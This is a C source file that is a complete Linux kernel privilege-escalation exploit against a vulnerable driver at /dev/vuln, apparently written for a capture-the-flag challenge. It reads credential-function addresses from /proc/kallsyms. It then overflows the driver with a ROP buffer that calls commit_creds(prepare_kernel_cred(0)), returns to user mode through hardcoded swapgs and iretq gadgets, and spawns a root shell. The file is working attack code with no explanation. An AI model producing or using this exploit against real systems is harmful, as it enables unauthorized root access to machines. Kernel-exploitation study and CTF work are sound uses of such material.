#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get_shell()
{
	system("/bin/sh");
}
size_t commit_creds = 0,prepare_kernel_cred = 0;

size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/proc/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds: %p\n", commit_creds);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

int main()
{
	size_t iretq = 0xFFFFFFFF811335EF;		//iretq;
	size_t swapgs_ret = 0xFFFFFFFF817B6B48;		//swapgs; ret;
	save_status();
	int fd = open("/dev/vuln",2);
	if(fd < 0)
    {
        puts("[*]open /dev/vuln error!");
        exit(0);
    }
    find_symbols();
    char rop[0xB0];
    memset(rop,1,0xB0);
    *((size_t*)(rop+0x74)) = (size_t)get_root;
    *((size_t*)(rop+0x7C)) = swapgs_ret;
    *((size_t*)(rop+0x84)) = iretq;
    *((size_t*)(rop+0x8C)) = (size_t)get_shell;
    *((size_t*)(rop+0x94)) = user_cs;
    *((size_t*)(rop+0x9C)) = user_rflags;
    *((size_t*)(rop+0xA4)) = user_sp;
    *((size_t*)(rop+0xAC)) = user_ss;
    puts("[*] Build Success");
    write(fd,rop,200);
    close(fd);
    return 0;
}
